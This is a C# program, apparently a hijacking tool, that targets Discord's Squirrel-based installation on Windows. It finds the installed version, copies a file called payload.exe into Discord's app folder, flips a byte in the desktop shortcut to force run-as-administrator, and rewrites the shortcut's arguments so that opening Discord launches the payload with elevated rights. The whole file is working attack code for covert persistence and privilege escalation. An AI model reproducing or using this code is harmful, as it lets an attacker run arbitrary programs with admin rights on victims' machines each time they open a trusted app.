using IWshRuntimeLibrary;
using System;
using System.IO;
using System.Text.RegularExpressions;

namespace SquirrelFramework
{
    internal class Program
    {
        public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static readonly string AppName = "Discord";

        static void Main(string[] args)
        {
            string appRoot = Path.Combine(LocalAppData, AppName);

            if (!Directory.Exists(appRoot))
            {
                Console.WriteLine($"{AppName} path not found.");
                return;
            }

            string releasesFilePath = Path.Combine(appRoot, "packages", "RELEASES");

            if (!System.IO.File.Exists(releasesFilePath))
            {
                Console.WriteLine("Releases file not found.");
                return;
            }

            string version = ExtractVersion(releasesFilePath);

            if (string.IsNullOrEmpty(version))
            {
                Console.WriteLine("Failed to extract the current version.");
                return;
            }

            if (!CopyPayloadToDirectory(appRoot, version))
            {
                Console.WriteLine("Failed to find the target app path.");
                return;
            }

            if (EditShortCut())
            {
                Console.WriteLine("edited shortcut with success.");
            }
            else
            {
                Console.WriteLine("failed to edit the shortcut.");
            }
        }

        static bool EditShortCut()
        {
            string shortcutPath = Path.Combine(DesktopPath, $"{AppName}.lnk");
            if (!System.IO.File.Exists(shortcutPath))
            {
                return false;
            }

            // set shortcut to run as admin
            byte[] data = System.IO.File.ReadAllBytes(shortcutPath);
            data[21] = 34;
            System.IO.File.WriteAllBytes(shortcutPath, data);

            // change shortcut arguments
            var shortcut = new IWshShell_Class().CreateShortcut(shortcutPath) as IWshShortcut;
            shortcut.Arguments = $"--processStart \"payload.exe\" --process-start-args \"{AppName}.exe\"";
            shortcut.Save();

            return true;
        }

        static bool CopyPayloadToDirectory(string discordPath, string version)
        {
            string payloadPath = "payload.exe";
            string appDirectory = Path.Combine(discordPath, $"app-{version}");

            if (Directory.Exists(appDirectory))
            {
                System.IO.File.Copy(payloadPath, Path.Combine(appDirectory, "payload.exe"), true);
                return true;
            }

            return false;
        }

        static string ExtractVersion(string filepath)
        {
            string content = System.IO.File.ReadAllText(filepath);

            string pattern = @"\d+(\.\d+)+";
            Match match = Regex.Match(content, pattern);

            if (match.Success)
                return match.Value;

            return string.Empty;
        }
    }
}
